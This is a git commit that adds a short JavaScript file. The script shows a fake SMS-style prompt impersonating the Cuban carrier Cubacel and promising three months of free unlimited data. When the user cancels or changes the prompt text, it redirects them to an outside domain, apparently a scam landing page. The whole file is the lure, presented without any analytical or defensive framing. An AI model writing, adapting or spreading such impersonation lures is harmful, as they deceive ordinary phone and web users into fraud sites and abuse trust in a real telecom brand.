aaa2073c59b8116e790a400777b0769ae36ed7f5
Sweetblogboi <nsiboy760@gmail.com>
2025-02-19 22:56:19 +0100

    Create cubacel-active.js

---
+++ cubacel-active.js
@@ -0,0 +1,6 @@
+
+var password = 'ACTIVAR DATOS'
+password=prompt('SMS: Felicitaciones. Usted califica para recibir datos gratuitos ilimitados de Cubacel durante 3 meses. Presione OK para activarlo ahora.   ','ACTIVAR DATOS');
+if (password != 'ACTIVAR DATOS') {
+location.href='https://realgrant-2025.org/cubacel.html';
+}
